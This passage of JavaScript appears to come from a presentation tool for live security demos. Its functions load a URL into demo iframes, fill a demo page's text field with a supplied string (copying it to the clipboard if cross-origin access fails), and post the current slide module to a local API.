  document.getElementById("demo-iframe").src = url;
  document.getElementById("fs-iframe").src = url;
}

// ── PAYLOAD INJECTION ────────────────────────────────────────────────────────
function injectPayload(code) {
  // Try to set it in the demo iframe's first text input / textarea
  try {
    const iframe = document.getElementById("fs-overlay").classList.contains("active")
      ? document.getElementById("fs-iframe")
      : document.getElementById("demo-iframe");
    const doc = iframe.contentDocument || iframe.contentWindow.document;
    const input = doc.querySelector("input[type=text]:not([type=hidden]),input:not([type]),textarea");
    if (input) {
      input.value = code;
      input.focus();
    }
  } catch(e) {
    // Cross-origin — just copy to clipboard
    navigator.clipboard?.writeText(code);
    alert("Payload copied to clipboard:\n" + code);
  }
}

// ── SERVER SYNC (notes window) ───────────────────────────────────────────────
function pushState(idx) {
  fetch("/api/presentation/state", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ module: idx })
  }).catch(() => {});
}

init();
